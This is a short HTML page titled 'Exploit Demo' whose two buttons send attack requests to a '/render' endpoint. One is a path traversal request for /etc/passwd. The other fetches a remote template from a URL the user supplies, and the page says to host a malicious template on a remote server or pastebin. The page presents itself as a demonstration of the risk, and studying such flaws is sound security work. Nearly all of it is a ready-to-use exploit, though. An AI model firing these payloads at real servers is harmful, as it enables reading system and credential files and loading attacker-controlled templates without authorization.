<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit Demo</title>
</head>
<body>
    <h1>Exploit Demo Page</h1>

    <h3>1. Local File Read:</h3>
    <p>Click the button below to attempt to read the <code>/etc/passwd</code> file (or any other system file you'd like to target).</p>
    <button onclick="window.open('/render?page=../../../etc/passwd', '_blank')">Read /etc/passwd</button>

    <h3>2. Remote File Read:</h3>
    <p>Click the button below to attempt to fetch a remote template. Note: You'll need a remote server or a service like pastebin to host a malicious template.</p>
    <button onclick="window.open('/render?page=YOUR_REMOTE_URL_HERE&use_remote=true', '_blank')">Fetch Remote Template</button>

    <p>Replace <code>YOUR_REMOTE_URL_HERE</code> with a link to a remote template file. This demonstrates the risk of fetching files from arbitrary remote locations.</p>

</body>
</html>
